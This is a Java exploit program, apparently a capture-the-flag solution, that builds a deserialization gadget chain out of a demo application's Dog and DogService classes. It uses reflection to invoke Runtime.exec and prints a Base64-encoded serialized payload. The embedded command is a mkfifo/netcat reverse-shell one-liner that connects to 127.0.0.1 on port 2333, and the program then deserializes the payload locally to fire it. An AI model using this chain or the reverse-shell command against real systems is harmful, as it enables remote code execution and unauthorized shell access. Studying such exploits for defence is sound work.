import com.example.demo.Dog.Dog;
import com.example.demo.Dog.DogService;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class Exp1{
    // 序列化并Base64编码
    public static String serializeBase64(Object obj) throws Exception {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
    // Base64解码并反序列化
    public static Object unserializeBase64(String base64Data) throws IOException, ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(base64Data);
        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bais)) {
            return ois.readObject();
        }
    }
    // 反射设置字段值
    public static void setField(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    // 创建Dog对象
    public static Dog createDog(Object object, String methodName, Class[] paramTypes, Object[] args) throws Exception{
        Dog dog = new Dog(1, "dog", "dog", 1);
        setField(dog, "object", object);
        setField(dog, "methodName", methodName);
        setField(dog, "paramTypes", paramTypes);
        setField(dog, "args", args);
        return dog;
    }

    public static void main(String[] args) throws Exception{
        // 要执行的命令
//        String command = "calc";
        String[] command = new String[] {
                "/bin/sh",
                "-c",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 2333 >/tmp/f"
        };
        // 构造链式调用
        // 第一步：获取 getRuntime 方法对象
        Dog dog1 = createDog(Runtime.class, "getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null});
        // 第二步：执行 getRuntime().invoke(null) 获取 Runtime 实例
        Dog dog2 = createDog(dog1, "invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
        // 第三步：执行 Runtime.exec(command)
        Dog dog3 = createDog(dog2, "exec", new Class[]{String[].class}, new Object[]{command});

        // 构造 DogService 对象，填充逻辑链
        DogService dogService = new DogService();
        // 反射获取 dogs 字段
        Field dogsField = DogService.class.getDeclaredField("dogs");
        dogsField.setAccessible(true);
        Map<Integer, Dog> dogs = (Map<Integer, Dog>) dogsField.get(dogService);
        // 依次放入 Map，chainWagTail 会按顺序遍历并传递 result
        dogs.put(1, dog1);
        dogs.put(2, dog2);
        dogs.put(3, dog3);

        // 构造触发点
        Dog dog4 = createDog(dogService, "aaa", null, null);

        // 触发触发点
        Map<Object, Object> hashMap = new HashMap();
        hashMap.put(dog4, "value");

        setField(dog4, "methodName", "chainWagTail");

        // 生成payload
        String payload = serializeBase64(hashMap);
        System.out.println(payload);
        unserializeBase64(payload);
    }
}